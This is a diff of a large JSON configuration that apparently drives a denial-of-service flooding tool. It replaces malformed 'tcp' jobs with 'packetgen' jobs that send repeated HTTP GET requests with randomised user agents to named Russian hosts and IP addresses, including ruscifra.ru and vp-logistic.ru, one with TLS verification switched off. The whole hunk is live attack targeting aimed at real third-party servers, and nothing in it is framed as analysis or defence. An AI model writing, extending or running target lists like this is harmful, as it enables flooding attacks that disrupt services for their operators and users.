@@ -17308,14 +17308,34 @@
       "count": 1
     },
     {
-      "type": "tcp",
-      "count": 1,
-      "name": "undefined",
+      "type": "packetgen",
+      "name": "ruscifra.ru",
       "args": {
-        "address": "undefined://185.221.152.197:",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "185.221.152.197:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://ruscifra.ru/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 1
     },
     {
       "type": "packetgen",
@@ -20588,24 +20608,58 @@
       "count": 1
     },
     {
-      "type": "tcp",
-      "count": 1,
-      "name": "undefined",
+      "type": "packetgen",
+      "name": "vp-logistic.ru",
       "args": {
-        "address": "undefined://109.70.26.37:",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "109.70.26.37:80"
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "http://vp-logistic.ru/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 1
     },
     {
-      "type": "tcp",
-      "count": 1,
-      "name": "undefined",
+      "type": "packetgen",
+      "name": "vp-logistic.ru",
       "args": {
-        "address": "undefined://194.85.61.76:",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "194.85.61.76:80"
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "http://vp-logistic.ru/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 1
     },
     {
       "type": "packetgen",
